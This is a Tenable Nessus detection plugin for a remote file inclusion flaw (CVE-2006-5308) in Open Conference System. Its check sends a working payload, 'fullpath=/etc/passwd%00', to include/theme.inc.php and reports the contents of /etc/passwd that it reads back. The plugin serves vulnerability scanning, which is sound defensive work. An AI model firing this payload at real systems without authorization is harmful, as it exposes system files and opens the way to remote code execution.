#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(22874);
  script_version("$Revision: 1.17 $");

  script_cve_id("CVE-2006-5308");
  script_bugtraq_id(20567);
  script_osvdb_id(29739, 29740);
  script_xref(name:"EDB-ID", value:"2536");

  script_name(english:"Open Conference System < 1.1.6 Multiple Script fullpath Parameter Remote File Inclusion");
  script_summary(english:"Tries to read a local file with OCS");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
remote file include issues." );
 script_set_attribute(attribute:"description", value:
"The remote host is using Open Conference System, a PHP application for
managing scholarly conference websites. 

The version of Open Conference System installed on the remote host
fails to sanitize input to the 'fullpath' parameter before using it to
include PHP code in the 'include/theme.inc.php' and 'footer.inc.php'
scripts.  Provided PHP's 'register_globals' setting is enabled, an
unauthenticated attacker may be able to exploit these issues to view
arbitrary files or to execute arbitrary PHP code on the remote host,
subject to the privileges of the web server user id." );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Open Conference System 1.1.6 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:W/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2006/10/18");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/10/13");
 script_cvs_date("$Date: 2014/04/25 22:31:27 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2014 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/ocs", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Try to read a local file on the remote host.
  file = "/etc/passwd";
  w = http_send_recv3(method:"GET",
    item:string(
      dir, "/include/theme.inc.php?",
      "fullpath=", file, "%00"
    ),
    port:port
  );
  if (isnull(w)) exit(1, "The web server on port "+port+" did not answer");
  res = w[2];

  # There's a problem if there's an entry for root.
  if (
    # there's an entry for root or...
    egrep(pattern:"root:.*:0:[01]:", string:res) ||
    # we get an error saying "failed to open stream" or...
    string("main(", file, "\\0themes/Default/theme.inc.php): failed to open stream") >< res ||
    # we get an error claiming the file doesn't exist or...
    string("main(", file, "): failed to open stream: No such file") >< res ||
    # we get an error about open_basedir restriction.
    string("open_basedir restriction in effect. File(", file) >< res
  )
  {
    if (report_verbosity && egrep(pattern:"root:.*:0:[01]:", string:res))
    {
      report = string(
        "\n",
        "Here are the contents of the file '/etc/passwd' that Nessus\n",
        "was able to read from the remote host :\n",
        "\n",
        res
      );
      security_hole(port:port, extra:report);
    }
    else security_hole(port);

    exit(0);
  }
}
